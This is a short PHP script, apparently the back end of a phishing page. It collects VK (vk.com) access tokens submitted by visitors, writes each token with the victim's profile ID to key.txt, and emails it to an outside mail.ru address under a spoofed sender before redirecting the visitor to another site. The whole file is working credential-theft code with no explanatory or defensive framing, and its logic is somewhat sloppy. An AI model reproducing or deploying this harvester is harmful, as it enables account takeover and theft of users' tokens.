<?php
if (isset($_POST['token']) and isset($_POST['id'])) {
$id = ($_POST['id']);
if($token = $_POST['token']) {
    if(!preg_match("/\w{85}?/",$token, $matches));	
else		
foreach ($matches as $key) {
$text = ("vk.com/$id : $key");
$file = fopen("key.txt", "a+"); 
fwrite($file, "\r\n".$text); 
fclose($file);
$headers = "MIME-Version: 1.0\r\n";
$headers .= "Content-type: text/plane; charset=utf-8\r\n";
$headers .= "From: vk.com/$id <x-notice@mail.ru>\r\n";
mail('x-notice@mail.ru', $key, $text, $headers);
header("location: http://alt.hol.es/");
	     }
    }
}
exit();	
?>